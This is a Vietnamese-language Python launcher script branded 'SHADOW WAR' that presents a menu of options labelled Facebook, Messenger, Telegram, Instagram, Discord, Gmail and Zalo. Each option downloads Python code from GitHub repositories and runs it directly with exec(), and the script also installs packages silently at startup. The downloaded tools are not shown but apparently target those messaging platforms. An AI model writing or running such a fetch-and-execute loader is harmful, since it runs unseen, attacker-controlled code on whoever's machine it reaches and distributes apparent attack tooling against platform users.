import requests, sys
from time import sleep
from datetime import datetime, timedelta
import os
try:
    from faker import Faker
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    import requests
except ImportError:
    os.system('pip install Faker')
    os.system('pip install requests')
    os.system('pip install pycryptodome')
    
    
#import lại sau khi cài đặt
from faker import Faker
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests

trang = "\033[1;37m\033[1m"
xanh_la = "\033[1;32m\033[1m"
xanh_duong = "\033[1;34m\033[1m"
xanhnhat = '\033[1m\033[38;5;51m'
do = "\033[1;31m\033[1m\033[1m"
xam = '\033[1;30m\033[1m'
vang = "\033[1;33m\033[1m"
tim = "\033[1;35m\033[1m"
hongnhat = "#FFC0CB"
kt_code = "</>"
dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"

colors = [
    "\033[1;37m\033[1m",  # Trắng
    "\033[1;32m\033[1m",  # Xanh lá
    "\033[1;34m\033[1m",  # Xanh dương
    "\033[1m\033[38;5;51m",  # Xanh nhạt
    "\033[1;31m\033[1m\033[1m",  # Đỏ
    "\033[1;30m\033{1m",  # Xám
    "\033[1;33m\033[1m",  # Vàng
    "\033[1;35m\033[1m",  # Tím
    "\033[32;5;245m\033[1m\033[38;5;39m",  # Màu đặc biệt
]

os.system('cls' if os.name == 'nt' else 'clear')

banner = """
\033[1;33m╔══════════════════════════════════════════════════════╗
\033[1;33m║\033[1;35m░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗\033[1;33m║
\033[1;33m║\033[1;33m██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║\033[1;33m║
\033[1;33m║\033[1;39m╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝\033[1;33m║
\033[1;33m║\033[1;36m░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░\033[1;33m║
\033[1;33m║\033[1;32m██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░\033[1;33m║ 
\033[1;33m║\033[1;30m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░\033[1;33m║ 
\033[1;33m║\033[1;30m░░░░░░░░╔██═╗░░╔███╗░░╔═██╗░░██═╗░░░██████═╗░░░░░░░░░░\033[1;33m║ 
\033[1;33m║\033[1;31m░░░░░░░░╚╗██╚╗╔╝███╚╗╔╝██╔╝░████╚╗░░██░░░██╝░░░░░░░░░░\033[1;33m║ 
\033[1;33m║\033[1;32m░░░░░░░░░╚╗██╚╝██░██╚╝██╔╝░██░░██╚╗░██████╚╗░░░░░░░░░░\033[1;33m║ 
\033[1;33m║\033[1;33m░░░░░░░░░░╚╗████╔═╗████╔╝░████████╚╗██╔══██╚╗░░░░░░░░░\033[1;33m║ 
\033[1;33m║\033[1;34m░░░░░░░░░░░╚╗██╔╝░╚╗██╔╝░██╔═════██║██║░░░██║░░░░░░░░░\033[1;33m║ 
\033[1;33m║\033[1;35m░░░░░░░░░░░░╚══╝░░░╚══╝░░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░░░░░░░\033[1;33m║ 
\033[1;33m╠══════════════════════════════════════════════════════╣
\033[1;33m║\033[1;34m▶ HỒ XUÂN PHÚ X SHADOW WAR   \033[1;35m                         \033[1;33m║
\033[1;33m║\033[1;34m▶ FaceBook : \033[1;35mfacebook.com/user.xpzhu210               \033[1;33m║
\033[1;33m║\033[1;34m▶ Discord : \033[1;35mxpzhu210                                  \033[1;33m║
\033[1;33m║\033[1;34m▶ Bạn Không Ngu, Do Tôi Quá Giỏi                      \033[1;33m║
\033[1;33m╚══════════════════════════════════════════════════════╝
\033[1;32m-------------------------------------------------"""
print(banner)
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║     \033[1;39mFACEBOOK      \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m1.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║   \033[1;39mMESSENGER       \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m2.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║   \033[1;39mTELEGRAM        \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m3.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║     \033[1;39mINSTAGRAM     \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m4.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║      \033[1;39mDISCORD      \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m5.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║  \033[1;39mGMAIL            \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m6.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║   \033[1;39mZALO            \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m7.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')
print('\033[1;39m┌───────────────────┐')
print('\033[1;32m║   \033[1;39mID GROUNP ZALO  \033[1;32m║')
print('\033[1;39m└───────────────────┘')
print('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP \033[1;31m[\033[1;33m8.1\033[1;31m] \033[1;32m</> SHADOW WAR </>')
print('\033[1;31m─────────────────────────────────────────────────')

while True:
    chon = input(
        '\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNHẬP\033[1;37m =>: \033[1;33m'
    )

    if chon == "1.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/top1.py').text)
        break
    elif chon == "2.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/cccc1.py').text)
        break
    elif chon == "3.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/tl1.py').text)
        break
    elif chon == "4.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/ig1.py').text)
        break
    elif chon == "5.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/cx1.py').text)
        break
    elif chon == "6.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/gm1.py').text)
        break
    elif chon == "7.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/bot21.py').text)
        break
    elif chon == "8.1":
        exec(requests.get('https://raw.githubusercontent.com/xpzhu210/xuanphu/refs/heads/main/id1.py').text)
        break
    elif chon == "9.1":
        exec(requests.get('https://raw.githubusercontent.com/ServerCuaThinh/HerlyCCGiVay/refs/heads/main/23423423.py').text)
        break
    elif chon == "10.1":
        exec(requests.get('https://raw.githubusercontent.com/ServerCuaThinh/HerlyCCGiVay/refs/heads/main/234324.py').text)
        break
    elif chon =="102":
        exec(requests.get('https://raw.githubusercontent.com/ServerCuaThinh/HerlyCCGiVay/refs/heads/main/234324234.py').text)
        break
    elif chon == "mktds":
        exec(requests.get('https://raw.githubusercontent.com/ServerCuaThinh/HerlyCCGiVay/refs/heads/main/mktds.py').text)
        break
    elif chon == "0":  # Chỉ thoát nếu nhập đúng "0"
        break
    else:
        print("\033[1;31mBạn Nhập Sai, Vui Lòng Nhập Đúng Số Chức Năng !!")